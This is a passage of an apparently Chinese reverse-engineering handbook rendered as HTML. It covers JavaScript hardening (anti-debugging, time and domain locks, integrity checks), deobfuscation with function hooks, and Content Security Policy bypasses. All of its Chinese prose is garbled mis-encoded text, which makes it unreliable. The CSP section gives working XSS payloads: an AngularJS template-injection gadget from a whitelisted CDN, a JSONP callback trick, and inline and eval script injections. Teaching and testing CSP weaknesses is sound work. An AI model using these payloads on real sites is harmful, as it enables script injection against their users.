<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">callPhantom</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">_phantom</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;PhantomJS detected!&#39;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="3-æ—¶é—´é”-time-lock">3. æ—¶é—´é” (Time Lock)</h3>

      <p><strong>åŸç†</strong>: ä»£ç åœ¨ç‰¹å®šæ—¶é—´åå¤±æ•ˆã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">expiryDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">(</span><span class="s1">&#39;2025-12-31&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">now</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">();</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">now</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">expiryDate</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="s1">&#39;This code has expired&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="c1">// æ­£å¸¸é€»è¾‘</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="4-åŸŸåç»‘å®š-domain-lock">4. åŸŸåç»‘å®š (Domain Lock)</h3>

      <p><strong>åŸç†</strong>: ä»£ç åªåœ¨ç‰¹å®šåŸŸåä¸‹è¿è¡Œã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">allowedDomains</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;example.com&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;www.example.com&#39;</span><span class="p">];</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">currentDomain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hostname</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">allowedDomains</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">currentDomain</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="s1">&#39;Unauthorized domain&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h3 id="5-ä»£ç å®Œæ•´æ€§æ ¡éªŒ">5. ä»£ç å®Œæ•´æ€§æ ¡éªŒ</h3>

      <p><strong>åŸç†</strong>: æ£€æµ‹ä»£ç æ˜¯å¦è¢«ä¿®æ”¹ã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">checkIntegrity</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">scriptContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">).</span><span class="nx">textContent</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">SHA256</span><span class="p">(</span><span class="nx">scriptContent</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">expectedHash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;abc123...&quot;</span><span class="p">;</span><span class="w">  </span><span class="c1">// é¢„å…ˆè®¡ç®—çš„å“ˆå¸Œ</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">hash</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="nx">expectedHash</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="ne">Error</span><span class="p">(</span><span class="s1">&#39;Code tampering detected!&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">checkIntegrity</span><span class="p">();</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é€†å‘åˆ†ææ–¹æ³•">é€†å‘åˆ†ææ–¹æ³•</h2>

      <h3 id="1-è‡ªåŠ¨åŒ–åæ··æ·†å·¥å…·">1. è‡ªåŠ¨åŒ–åæ··æ·†å·¥å…·</h3>

      <ul>
        <li><strong>Prettier</strong>: ç¾åŒ–ä»£ç </li>
        <li><strong>webcrack</strong>: è‡ªåŠ¨åæ··æ·†</li>
        <li><strong>de4js</strong>: å¤šç§æ··æ·†å™¨çš„åæ··æ·†</li>
        <li><strong>JSNice</strong>: å˜é‡é‡å‘½å</li>
      </ul>

      <p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ä½¿ç”¨ webcrack</span>
npx<span class="w"> </span>webcrack<span class="w"> </span>input.js<span class="w"> </span>-o<span class="w"> </span>output.js

<span class="c1"># ä½¿ç”¨ de4js</span>
<span class="c1"># è®¿é—® https://lelinhtinh.github.io/de4js/</span>
</code></pre>
      </div>

      <h3 id="2-æ‰‹åŠ¨åˆ†ææµç¨‹">2. æ‰‹åŠ¨åˆ†ææµç¨‹</h3>

      <p><strong>æ­¥éª¤1: ç¾åŒ–ä»£ç </strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä½¿ç”¨ Prettier æˆ– JS Beautifier</span>
</code></pre>
      </div>

      <p><strong>æ­¥éª¤2: å­—ç¬¦ä¸²è§£å¯†</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook è§£å¯†å‡½æ•°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">_decode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">_0x1a2b</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">_0x1a2b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_decode</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Decoded:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>æ­¥éª¤3: æ§åˆ¶æµè¿˜åŸ</strong></p>

      <ul>
        <li>ä½¿ç”¨è°ƒè¯•å™¨å•æ­¥æ‰§è¡Œ</li>
        <li>ç»˜åˆ¶æ§åˆ¶æµå›¾</li>
        <li>AST è½¬æ¢å·¥å…·</li>
      </ul>

      <p><strong>æ­¥éª¤4: å˜é‡é‡å‘½å</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// é€šè¿‡ä¸Šä¸‹æ–‡æ¨æ–­å˜é‡å«ä¹‰</span>
<span class="c1">// ä½¿ç”¨ IDE æ‰¹é‡é‡å‘½å</span>
</code></pre>
      </div>

      <h3 id="3-åŠ¨æ€åˆ†æ">3. åŠ¨æ€åˆ†æ</h3>

      <p><strong>Hook å…³é”®å‡½æ•°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook fetch</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Fetch:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalFetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">// Hook WebSocket</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalWebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;WebSocket:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">originalWebSocket</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
<span class="p">};</span>

<span class="c1">// Hook eval</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalEval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nb">eval</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nb">eval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Eval:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">code</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalEval</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <h3 id="å¼€å‘è€…åŠ å›ºæ–¹">å¼€å‘è€…ï¼ˆåŠ å›ºæ–¹ï¼‰</h3>

      <ol>
        <li>
          <p><strong>å¤šå±‚é˜²æŠ¤</strong>:</p>

          <ul>
            <li>æ··æ·† + è™šæ‹Ÿæœº + WebAssembly</li>
            <li>ä¸è¦ä¾èµ–å•ä¸€ä¿æŠ¤</li>
          </ul>
        </li>
        <li>
          <p><strong>å…³é”®ä»£ç æœåŠ¡å™¨ç«¯</strong>:</p>

          <ul>
            <li>æ•æ„Ÿç®—æ³•æ”¾åœ¨åç«¯</li>
            <li>å‰ç«¯åªåšå±•ç¤º</li>
          </ul>
        </li>
        <li>
          <p><strong>å®šæœŸæ›´æ–°</strong>:</p>

          <ul>
            <li>æ··æ·†ç­–ç•¥å®šæœŸå˜åŒ–</li>
            <li>æ£€æµ‹ç»•è¿‡æ–¹æ³•å¹¶æ›´æ–°</li>
          </ul>
        </li>
        <li>
          <p><strong>æ€§èƒ½å¹³è¡¡</strong>:</p>

          <ul>
            <li>è¿‡åº¦æ··æ·†å½±å“æ€§èƒ½</li>
            <li>è¯„ä¼°ä¿æŠ¤å¼ºåº¦ä¸æ€§èƒ½æŸå¤±</li>
          </ul>
        </li>
      </ol>

      <h3 id="é€†å‘åˆ†æè€…">é€†å‘åˆ†æè€…</h3>

      <ol>
        <li>
          <p><strong>è‡ªåŠ¨åŒ–ä¼˜å…ˆ</strong>:</p>

          <ul>
            <li>å…ˆå°è¯•è‡ªåŠ¨åŒ–å·¥å…·</li>
            <li>èŠ‚çœæ—¶é—´æˆæœ¬</li>
          </ul>
        </li>
        <li>
          <p><strong>åŠ¨æ€åˆ†æä¸ºä¸»</strong>:</p>

          <ul>
            <li>Hook å…³é”®å‡½æ•°</li>
            <li>è¿è¡Œæ—¶è§‚å¯Ÿè¡Œä¸º</li>
          </ul>
        </li>
        <li>
          <p><strong>åˆ†æ¨¡å—æ”»å…‹</strong>:</p>

          <ul>
            <li>è¯†åˆ«æ ¸å¿ƒé€»è¾‘</li>
            <li>å…¶ä»–éƒ¨åˆ†å¯ä»¥å¿½ç•¥</li>
          </ul>
        </li>
        <li>
          <p><strong>åˆæ³•åˆè§„</strong>:</p>

          <ul>
            <li>ä»…åœ¨æˆæƒèŒƒå›´å†…åˆ†æ</li>
            <li>éµå®ˆæ³•å¾‹æ³•è§„</li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">å¸¸è§é—®é¢˜</h2>

      <h3 id="q-å‰ç«¯åŠ å›ºèƒ½å®Œå…¨é˜²æ­¢é€†å‘å—">Q: å‰ç«¯åŠ å›ºèƒ½å®Œå…¨é˜²æ­¢é€†å‘å—ï¼Ÿ</h3>

      <p><strong>A</strong>: ä¸èƒ½ã€‚å‰ç«¯ä»£ç æœ€ç»ˆåœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œï¼Œç†è®ºä¸Šå¯ä»¥è¢«å®Œå…¨é€†å‘ã€‚åŠ å›ºåªèƒ½æé«˜é€†å‘éš¾åº¦å’Œæˆæœ¬ï¼Œå»¶ç¼“æ”»å‡»è€…ï¼Œä½†æ— æ³•å®Œå…¨é˜»æ­¢ã€‚</p>

      <h3 id="q-å“ªç§åŠ å›ºæ–¹å¼æœ€æœ‰æ•ˆ">Q: å“ªç§åŠ å›ºæ–¹å¼æœ€æœ‰æ•ˆï¼Ÿ</h3>

      <p><strong>A</strong>: æ²¡æœ‰ç»å¯¹æœ€æœ‰æ•ˆçš„å•ä¸€æ–¹æ³•ã€‚æœ€ä½³å®è·µæ˜¯ï¼š</p>

      <ol>
        <li>å¤šå±‚é˜²æŠ¤ï¼ˆæ··æ·† + VM + Wasmï¼‰</li>
        <li>å…³é”®é€»è¾‘æœåŠ¡å™¨ç«¯å¤„ç†</li>
        <li>å®šæœŸæ›´æ–°é˜²æŠ¤ç­–ç•¥</li>
      </ol>

      <h3 id="q-æ··æ·†ä¼šå½±å“æ€§èƒ½å—">Q: æ··æ·†ä¼šå½±å“æ€§èƒ½å—ï¼Ÿ</h3>

      <p><strong>A</strong>: ä¼šã€‚ä¸åŒç¨‹åº¦çš„æ··æ·†å½±å“ä¸åŒï¼š</p>

      <ul>
        <li>å˜é‡åæ··æ·†ï¼šå‡ ä¹æ— å½±å“</li>
        <li>æ§åˆ¶æµå¹³å¦åŒ–ï¼šæ˜¾è‘—å½±å“ï¼ˆ10-50%ï¼‰</li>
        <li>è™šæ‹Ÿæœºä¿æŠ¤ï¼šé‡å¤§å½±å“ï¼ˆ2-10å€æ…¢ï¼‰</li>
      </ul>

      <p>éœ€è¦åœ¨å®‰å…¨æ€§å’Œæ€§èƒ½é—´æƒè¡¡ã€‚</p>

      <h3 id="q-å¦‚ä½•æ£€æµ‹ä»£ç æ˜¯å¦è¢«æ··æ·†">Q: å¦‚ä½•æ£€æµ‹ä»£ç æ˜¯å¦è¢«æ··æ·†ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ£€æµ‹ç‰¹å¾</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">indicators</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">shortVarNames</span><span class="o">:</span><span class="w"> </span><span class="sr">/^[a-z_$][0-9]{1,4}$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">someVar</span><span class="p">),</span>
<span class="w">    </span><span class="nx">hexStrings</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;\\x&#39;</span><span class="p">),</span>
<span class="w">    </span><span class="nx">evalUsage</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;eval(&#39;</span><span class="p">),</span>
<span class="w">    </span><span class="nx">longLines</span><span class="o">:</span><span class="w"> </span><span class="nx">code</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;\n&#39;</span><span class="p">).</span><span class="nx">some</span><span class="p">(</span><span class="nx">l</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">l</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">500</span><span class="p">),</span>
<span class="w">    </span><span class="nx">switchCases</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/switch/g</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">[]).</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">10</span>
<span class="p">};</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Obfuscation indicators:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">indicators</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-javascript-vm-protection">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</a></li>
        <li><a href="#04-Advanced-Recipes-webassembly-reversing">WebAssembly é€†å‘</a></li>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="../02-Techniques/browser_debugging.md">æµè§ˆå™¨è°ƒè¯•æŠ€å·§</a></li>
        <li><a href="../02-Techniques/ast_analysis.md">AST åˆ†æä¸è½¬æ¢</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-csp-bypass">
      <h2>39. CSP Bypass</h2>
      <h1 id="csp-ç»•è¿‡æŠ€æœ¯">CSP ç»•è¿‡æŠ€æœ¯</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>å†…å®¹å®‰å…¨ç­–ç•¥ (Content Security Policy, CSP) æ˜¯ä¸€ç§é‡è¦çš„ Web å®‰å…¨æœºåˆ¶ï¼Œç”¨äºé˜²å¾¡ XSS å’Œæ•°æ®æ³¨å…¥æ”»å‡»ã€‚ç„¶è€Œï¼Œé…ç½®ä¸å½“çš„ CSP å¯èƒ½è¢«ç»•è¿‡ã€‚æœ¬æ–‡ä»‹ç» CSP
        çš„å·¥ä½œåŸç†ä»¥åŠå¸¸è§çš„ç»•è¿‡æŠ€æœ¯ã€‚</p>

      <hr />

      <h2 id="åŸºç¡€æ¦‚å¿µ">åŸºç¡€æ¦‚å¿µ</h2>

      <h3 id="å®šä¹‰">å®šä¹‰</h3>

      <p><strong>CSP (Content Security Policy)</strong> æ˜¯ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚ï¼Œé€šè¿‡ HTTP å“åº”å¤´æˆ– meta æ ‡ç­¾æŒ‡å®šæµè§ˆå™¨å¯ä»¥ä»å“ªäº›æ¥æºåŠ è½½èµ„æºã€‚å®ƒæ˜¯ä¸€ç§ç™½åå•æœºåˆ¶ï¼Œèƒ½æœ‰æ•ˆå‡å°‘
        XSS æ”»å‡»é¢ã€‚</p>

      <p><strong>åŸºæœ¬è¯­æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy: directive source; directive source</span>
</code></pre>
      </div>

      <p><strong>å¸¸è§æŒ‡ä»¤</strong>:</p>

      <ul>
        <li><code>default-src</code>: é»˜è®¤ç­–ç•¥</li>
        <li><code>script-src</code>: JavaScript æ¥æº</li>
        <li><code>style-src</code>: CSS æ¥æº</li>
        <li><code>img-src</code>: å›¾ç‰‡æ¥æº</li>
        <li><code>connect-src</code>: XMLHttpRequestã€WebSocket ç­‰è¿æ¥æ¥æº</li>
        <li><code>font-src</code>: å­—ä½“æ¥æº</li>
        <li><code>object-src</code>: <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>,
          <code>&lt;applet&gt;</code> æ¥æº</li>
        <li><code>media-src</code>: <code>&lt;audio&gt;</code>, <code>&lt;video&gt;</code> æ¥æº</li>
        <li><code>frame-src</code>: æ¡†æ¶æ¥æº</li>
      </ul>

      <h3 id="æ ¸å¿ƒåŸç†">æ ¸å¿ƒåŸç†</h3>

      <h4 id="csp-å·¥ä½œæµç¨‹">CSP å·¥ä½œæµç¨‹</h4>

      <ol>
        <li>æœåŠ¡å™¨å‘é€ CSP å¤´éƒ¨</li>
        <li>æµè§ˆå™¨è§£æç­–ç•¥</li>
        <li>æµè§ˆå™¨æ£€æŸ¥æ¯ä¸ªèµ„æºåŠ è½½è¯·æ±‚</li>
        <li>è¿åç­–ç•¥çš„è¯·æ±‚è¢«é˜»æ­¢</li>
        <li>è¿è§„æŠ¥å‘Šï¼ˆå¦‚é…ç½®äº† <code>report-uri</code>ï¼‰</li>
      </ol>

      <h4 id="csp-çº§åˆ«">CSP çº§åˆ«</h4>

      <ul>
        <li><strong>CSP Level 1</strong> (2012): åŸºç¡€æŒ‡ä»¤ï¼Œç™½åå•æœºåˆ¶</li>
        <li><strong>CSP Level 2</strong> (2015): æ·»åŠ  <code>nonce</code> å’Œ <code>hash</code>ï¼Œæ›´å¤šæŒ‡ä»¤</li>
        <li><strong>CSP Level 3</strong> (è‰æ¡ˆ): <code>strict-dynamic</code>ï¼Œ<code>unsafe-hashes</code> ç­‰</li>
      </ul>

      <hr />

      <h2 id="è¯¦ç»†å†…å®¹">è¯¦ç»†å†…å®¹</h2>

      <h3 id="csp-é…ç½®ç¤ºä¾‹">CSP é…ç½®ç¤ºä¾‹</h3>

      <h4 id="ä¸¥æ ¼-csp-æ¨è">ä¸¥æ ¼ CSP (æ¨è)</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy:</span>
<span class="err">  default-src &#39;none&#39;;</span>
<span class="err">  script-src &#39;nonce-random123&#39; &#39;strict-dynamic&#39;;</span>
<span class="err">  style-src &#39;nonce-random456&#39;;</span>
<span class="err">  img-src &#39;self&#39; https:;</span>
<span class="err">  font-src &#39;self&#39;;</span>
<span class="err">  connect-src &#39;self&#39;;</span>
<span class="err">  base-uri &#39;none&#39;;</span>
<span class="err">  form-action &#39;self&#39;;</span>
</code></pre>
      </div>

      <h4 id="å®½æ¾-csp-æ˜“å—æ”»å‡»">å®½æ¾ CSP (æ˜“å—æ”»å‡»)</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy:</span>
<span class="err">  default-src &#39;self&#39;;</span>
<span class="err">  script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; https://cdn.example.com;</span>
</code></pre>
      </div>

      <h3 id="ä¸»è¦ç»•è¿‡æŠ€æœ¯">ä¸»è¦ç»•è¿‡æŠ€æœ¯</h3>

      <h4 id="1-åˆ©ç”¨ç™½åå•-cdn">1. <strong>åˆ©ç”¨ç™½åå• CDN</strong></h4>

      <p>å¦‚æœ CSP å…è®¸æŸäº› CDNï¼Œæ”»å‡»è€…å¯ä»¥å¯»æ‰¾è¯¥ CDN ä¸Šçš„å¯åˆ©ç”¨è„šæœ¬ã€‚</p>

      <p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy: script-src &#39;self&#39; https://cdnjs.cloudflare.com</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cm">&lt;!-- åˆ©ç”¨ CDN ä¸Šçš„ AngularJS --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">div</span> <span class="na">ng-app</span> <span class="na">ng-csp</span><span class="p">&gt;</span>
  {{ constructor.constructor(&#39;alert(1)&#39;)() }}
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- åˆ©ç”¨ JSONP ç«¯ç‚¹ --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <p><strong>å¸¸è§å¯åˆ©ç”¨çš„åº“</strong>:</p>

      <ul>
        <li>AngularJS: æ¨¡æ¿æ³¨å…¥</li>
        <li>jQuery: JSONP</li>
        <li>Prototype.js: DOM æ³¨å…¥</li>
        <li>Google Analytics: <code>_gaq.push</code></li>
      </ul>

      <h4 id="2-åˆ©ç”¨-unsafe-inline-å’Œ-unsafe-eval">2. <strong>åˆ©ç”¨ <code>unsafe-inline</code> å’Œ
          <code>unsafe-eval</code></strong></h4>

      <p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy: script-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cm">&lt;!-- unsafe-inline å…è®¸å†…è”è„šæœ¬ --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- unsafe-eval å…è®¸ eval --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;alert(1)&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">setTimeout</span><span class="p">(</span><span class="s1">&#39;alert(1)&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">Function</span><span class="p">(</span><span class="s1">&#39;alert(1)&#39;</span><span class="p">)()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <h4 id="3-base-æ ‡ç­¾æ³¨å…¥">3. <strong>Base æ ‡ç­¾æ³¨å…¥</strong></h4>

      <p>å¦‚æœ CSP æ²¡æœ‰è®¾ç½® <code>base-uri</code>ï¼Œå¯ä»¥é€šè¿‡æ³¨å…¥ <code>&lt;base&gt;</code> æ ‡ç­¾åŠ«æŒç›¸å¯¹è·¯å¾„ã€‚</p>

      <p><strong>æ˜“å—æ”»å‡»çš„é…ç½®</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="err">Content-Security-Policy: script-src &#39;self&#39;</span>
</code></pre>
      </div>

      <p><strong>ç»•è¿‡æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cm">&lt;!-- åŸå§‹é¡µé¢æœ‰ç›¸å¯¹è·¯å¾„è„šæœ¬ --&gt;</span>
